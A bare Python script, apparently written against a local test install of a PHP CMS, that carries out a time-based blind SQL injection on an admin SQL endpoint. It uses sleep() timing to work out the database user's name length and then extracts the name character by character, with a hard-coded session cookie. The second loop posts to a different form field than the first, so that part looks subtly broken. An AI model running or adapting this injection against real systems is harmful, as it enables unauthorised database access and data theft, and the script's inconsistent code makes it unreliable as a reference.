import requests
import time
import base64
from urllib import parse
import urllib.parse
 
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Content-Type':'application/x-www-form-urlencoded',
'Connection':'close',
'Accept-Encoding':'gzip, deflate',
'Host':'127.0.0.1:82'}
Cookies = {'Hm_lvt_e2ecc5a8268ea1a4c9862ec7b4ee5b11':'1629945624,1631158528,1631849251,1632449126','PHPSESSID':'30ip29u5icsjkm5rsrnqleopm5'}

url = "http://127.0.0.1:82/admin.php?&m=Sql&a=sqlset"

result = ''
length  = 0
for l in range(1,20):
	payload = "select+1+and+if(length(user())=" + str(l) + ",sleep(2),1)"
	data = {'sqlstr' : payload,'sqlsub':'%E6%8F%90%E4%BA%A4'}
	stime =time.time()
	r = requests.post(url = url , headers = headers , data = data , cookies = Cookies)
	etime = time.time()
	if etime-stime >= 2:
		print("用户名长度是" + str(l))
		length = l + 1
		break
		
for i in range(1,length):
	for j in range(48,122):
		payload = "select+1+and+if(ascii(substring(user(),{},1))={},sleep(2),1)".format(str(i),str(j))
		data = {'data' : payload,'sqlsub':'%E6%8F%90%E4%BA%A4'}
		stime =time.time()
		r = requests.post(url = url , headers = headers , data = data , cookies = Cookies)
		etime = time.time()
		tim = etime-stime
		if tim >= 2:
			result += chr(j)
			print(result)
		


		